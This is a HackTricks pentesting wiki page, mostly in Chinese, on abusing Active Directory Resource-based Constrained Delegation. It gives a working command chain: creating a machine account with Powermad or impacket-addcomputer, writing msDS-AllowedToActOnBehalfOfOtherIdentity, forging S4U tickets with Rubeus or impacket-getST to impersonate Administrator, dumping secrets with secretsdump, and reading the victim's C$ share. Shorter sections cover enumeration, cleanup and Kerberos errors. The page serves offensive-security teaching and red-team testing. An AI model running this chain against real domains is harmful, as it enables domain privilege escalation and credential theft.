# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Resource-based Constrained Delegation 的基础

这与基本的 [Constrained Delegation](constrained-delegation.md) 类似，但**不是**把权限授予一个**对象**去**对一台机器模拟任意用户**，而是 Resource-based Constrained Delegation **在对象上设置谁能够对其模拟任意用户**。

在这种情况下，被约束的对象会有一个属性名为 _**msDS-AllowedToActOnBehalfOfOtherIdentity**_，其中包含可以对该对象模拟任意其他用户的用户名称。

另一个与其它 Delegation 形式的重要区别是，任何对**计算机账号**拥有**写权限等效**（_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_）的用户都可以设置 **_msDS-AllowedToActOnBehalfOfOtherIdentity_**（在其它 Delegation 形式中你需要 domain admin 权限）。

### 新概念

在 Constrained Delegation 中提到过，用户的 _userAccountControl_ 值中需要有 **`TrustedToAuthForDelegation`** 标志才能执行 **S4U2Self**。但这并不完全正确。\
实际上即使没有该值，如果你是一个**service**（有 SPN），你仍然可以对任何用户执行 **S4U2Self**；但是如果你**有 `TrustedToAuthForDelegation`**，返回的 TGS 会是**Forwardable**，如果你**没有**该标志，返回的 TGS **不会**是 **Forwardable**。

然而，如果用于 **S4U2Proxy** 的 **TGS** 不是 Forwardable，尝试滥用**基本的 Constrain Delegation**将**不起作用**。但如果你在利用 **Resource-Based constrain delegation**，它则会起作用。

### 攻击结构

> 如果你对一个 **Computer** 账户拥有 **写等效权限**，你可以在那台机器上获得**特权访问**。

假设攻击者已经对受害计算机拥有 **写等效权限**。

1. 攻击者**入侵**了一个具有 **SPN** 的账户或**创建了一个**（“Service A”）。注意任何一个普通的 _Admin User_（无需其它特殊权限）最多可以创建 10 个 Computer 对象（即 **_MachineAccountQuota_**）并为它们设置 SPN。所以攻击者可以创建一个 Computer 对象并设置一个 SPN。
2. 攻击者**滥用其对受害计算机（ServiceB）的 WRITE 权限**，配置资源型受限委托以允许 ServiceA 对该受害计算机（ServiceB）模拟任意用户。
3. 攻击者使用 Rubeus 从 Service A 对 Service B 对具有对 Service B 的特权访问的用户执行**完整的 S4U 攻击**（S4U2Self 和 S4U2Proxy）。
1. S4U2Self（来自被攻破/创建的 SPN 账号）：请求一个 **Administrator 到我的** 的 **TGS**（非 Forwardable）。
2. S4U2Proxy：使用上一步的**非 Forwardable TGS**去请求 **Administrator** 到 **受害主机** 的 **TGS**。
3. 即便你使用的是非 Forwardable TGS，由于你在利用 Resource-based constrained delegation，它仍然会生效。
4. 攻击者可以 **pass-the-ticket** 并 **模拟**该用户以获得对受害 ServiceB 的 **访问**。

要检查域的 _**MachineAccountQuota**_，你可以使用：
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## 攻击

### 创建计算机对象

您可以使用 **[powermad](https://github.com/Kevin-Robertson/Powermad):** 在域内创建计算机对象。
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### 配置基于资源的受限委派

**使用 activedirectory PowerShell 模块**
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**使用 powerview**
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### 执行完整的 S4U 攻击（Windows/Rubeus）

首先，我们使用密码 `123456` 创建了新的计算机对象，因此我们需要该密码的哈希：
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
这将打印该账户的 RC4 和 AES hashes。\
现在，可以执行 attack:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
你可以只询问一次，使用 Rubeus 的 `/altservice` 参数为更多服务生成更多票证：
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> 注意用户有一个属性，名为 "**Cannot be delegated**"。如果该属性为 True，你将无法冒充该用户。此属性可以在 bloodhound 中看到。

### Linux tooling: end-to-end RBCD with Impacket (2024+)

如果你在 Linux 上操作，你可以使用官方 Impacket 工具执行完整的 RBCD 链：
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
注意
- 如果强制启用 LDAP signing/LDAPS，则使用 `impacket-rbcd -use-ldaps ...`。
- 优先使用 AES 密钥；许多现代域限制 RC4。Impacket 和 Rubeus 都支持仅 AES 的流程。
- Impacket 可以为某些工具重写 `sname` ("AnySPN")，但应尽可能获取正确的 SPN（例如 CIFS/LDAP/HTTP/HOST/MSSQLSvc）。

### 访问

最后一行命令将执行 **complete S4U attack 并将注入 TGS**，将其从 Administrator 注入到受害主机的 **内存** 中。\
在此示例中，从 Administrator 请求了针对 **CIFS** 服务的 TGS，因此您将能够访问 **C$**：
```bash
ls \\victim.domain.local\C$
```
### 滥用不同的 service tickets

了解 [**available service tickets here**](silver-ticket.md#available-services)。

## 枚举、审计与清理

### 枚举已配置 RBCD 的计算机

PowerShell (解码 SD 以解析 SIDs):
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket (用一条命令读取或清除):
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### 清理 / 重置 RBCD

- PowerShell (清除属性):
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Kerberos 错误

- **`KDC_ERR_ETYPE_NOTSUPP`**: 这表示 Kerberos 被配置为不使用 DES 或 RC4，而你只提供了 RC4 哈希。至少向 Rubeus 提供 AES256 哈希（或者同时提供 rc4、aes128 和 aes256 哈希）。示例: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KRB_AP_ERR_SKEW`**: 这表示当前计算机的时间与 DC 的时间不同，Kerberos 无法正常工作。
- **`preauth_failed`**: 这表示提供的用户名 + 哈希无法登录。你可能在生成哈希时忘记在用户名内加入 "$" （例如 `.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`）。
- **`KDC_ERR_BADOPTION`**: 这可能意味着：
  - 你试图模拟的用户无法访问目标服务（因为你无法模拟它或因为该用户没有足够权限）
  - 所请求的服务不存在（例如你请求 winrm 的票证但 winrm 未运行）
  - 创建的 fakecomputer 丢失了对易受攻击服务器的权限，你需要将权限还给它。
  - 你在滥用经典 KCD；请记住 RBCD 使用 non-forwardable S4U2Self tickets，而 KCD 需要 forwardable。

## 注记、中继与替代方案

- 如果 LDAP 被过滤，你也可以通过 AD Web Services (ADWS) 写入 RBCD SD。参见：

{{#ref}}
adws-enumeration.md
{{#endref}}

- Kerberos 中继链经常以 RBCD 结尾，以一步获得 本地 SYSTEM。参见端到端的实用示例：

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- 如果 LDAP signing/channel binding 被 **禁用** 且你能创建机器账户，像 **KrbRelayUp** 这样的工具可以将被强制的 Kerberos 认证中继到 LDAP，在目标计算机对象上为你的机器账户设置 `msDS-AllowedToActOnBehalfOfOtherIdentity`，并立即从 off-host 通过 S4U 模拟 **Administrator**。

## 参考资料

- [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
- [https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- Impacket rbcd.py (官方): https://github.com/fortra/impacket/blob/master/examples/rbcd.py
- 包含近期语法的快速 Linux 备忘单: https://tldrbins.github.io/rbcd/
- [0xdf – HTB Bruno (LDAP signing off → Kerberos relay to RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)


{{#include ../../banners/hacktricks-training.md}}
